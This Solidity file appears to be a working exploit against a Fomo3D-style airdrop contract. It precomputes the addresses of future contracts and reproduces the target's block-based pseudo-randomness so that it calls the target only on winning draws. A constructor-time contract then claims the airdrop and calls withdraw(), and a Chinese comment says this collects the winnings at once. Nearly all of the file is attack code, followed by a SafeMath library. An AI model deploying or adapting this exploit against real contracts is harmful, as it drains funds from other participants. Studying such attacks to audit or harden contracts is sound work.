pragma solidity ^0.4.25;

contract manager {

    using SafeMath for uint;

    address[] private _proxy = new address[](100);
    uint[] private _nonce = new uint[](100);
    uint8 public seq;

    event next_address_event(address);
    event by_pass(bool);

    function proxy_initialization() public {
        for (uint8 i = 0; i < 10; i++) {
            _proxy[seq] = new proxy();
            seq ++;
        }

    }

    function attack(address attackee, uint airDropTracker_) public payable {
        for (uint8 i = 0; i < 100; i++) {
            address proxy_address = _proxy[i];
            uint proxy_nonce = _nonce[i] + 1;
            if (fake_airdrop(count_next_address(proxy_address, proxy_nonce), airDropTracker_)) {
                if (proxy_address.call.value(100000000000000000)(abi.encodeWithSelector(bytes4(keccak256("attack(address)")), attackee)) == false) {
                    // These code will not be executed, even though call fail.
                    revert();
                }
                _nonce[i] ++;

                break;
            }
        }
    }

    function fake_airdrop(address next_address, uint airDropTracker_) public  returns(bool) {


        uint256 seed = uint256(keccak256(abi.encodePacked(

            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(next_address)))) / (now)).add
            (block.number)

        )));
        if ((seed - ((seed / 1000) * 1000)) < airDropTracker_) {
            emit by_pass(true);
            return true;
        }
        else {
            emit by_pass(false);
            return false;
        }
    }

    function count_next_address(address addr, uint non) public returns(address) {

        uint8  len_non;
        uint8 len;
        bytes memory rlp;

        if (non >= 0 && non <= 0x7f)
            len_non = 0;
        else if (non <= 0xff)
            len_non = 1;
        else if (non <= 0xffff)
            len_non = 2;
        else if (non <= 0xffffff)
            len_non = 3;
        else if (non <= 0xffffffff)
            len_non = 4;
        else if (non <= 0xffffffffff)
            len_non = 5;
        else if (non <= 0xffffffffffff)
            len_non = 6;
        else if (non <= 0xffffffffffffff)
            len_non = 7;
        else if (non <= 0xffffffffffffffff)
            len_non = 8;


        len = 23 + len_non;
        rlp = new bytes(len);
        rlp[0] = byte(0xc0 + len - 1);
        rlp[1] = byte(0x80 + 20);
        for (uint8 i = 0; i < 20; i++)
            rlp[i + 2] = byte(uint8(uint160(addr) / uint160(2 ** (8 * (19 - uint256(i))))));
        if (non <= 0xf7 && non > 0)
            rlp[22] = byte(uint8(non));
        else {
            rlp[22] = byte(0x80 + len_non);
            for (i = 0; i < len_non; i++)
                rlp[23 + i] = byte(uint8(non / uint64(2 ** (8 * (len_non - 1 - uint256(i))))));
        }

        address temp = address(uint(keccak256(rlp)));

        emit next_address_event(temp);

        return temp;
    }
}
contract proxy {

    function attack(address attackee) public payable {
        (new final_call).value(100000000000000000)(attackee);
    }

}

contract final_call {

    constructor(address attackee) payable public {
        if (attackee.call.value(100000000000000000)(abi.encode(bytes4(keccak256("can_i_jump()")))) == false) {
            revert();
        }
		
		attackee.call(abi.encode(bytes4(keccak256("withdraw()")))); // 這邊在airdrop成功後, 馬上去withdraw賺到的錢
    }
}

/**
 * @title SafeMath v0.1.9
 * @dev Math operations with safety checks that throw on error
 * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
 * - added sqrt
 * - added sq
 * - added pwr 
 * - changed asserts to requires with error log outputs
 * - removed div, its useless
 */
library SafeMath {
    
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) 
        internal 
        pure 
        returns (uint256 c) 
    {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "SafeMath mul failed");
        return c;
    }

    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    
    /**
     * @dev gives square root of given x.
     */
    function sqrt(uint256 x)
        internal
        pure
        returns (uint256 y) 
    {
        uint256 z = ((add(x,1)) / 2);
        y = x;
        while (z < y) 
        {
            y = z;
            z = ((add((x / z),z)) / 2);
        }
    }
    
    /**
     * @dev gives square. multiplies x by x
     */
    function sq(uint256 x)
        internal
        pure
        returns (uint256)
    {
        return (mul(x,x));
    }
    
    /**
     * @dev x to the power of y 
     */
    function pwr(uint256 x, uint256 y)
        internal 
        pure 
        returns (uint256)
    {
        if (x==0)
            return (0);
        else if (y==0)
            return (1);
        else 
        {
            uint256 z = x;
            for (uint256 i=1; i < y; i++)
                z = mul(z,x);
            return (z);
        }
    }
}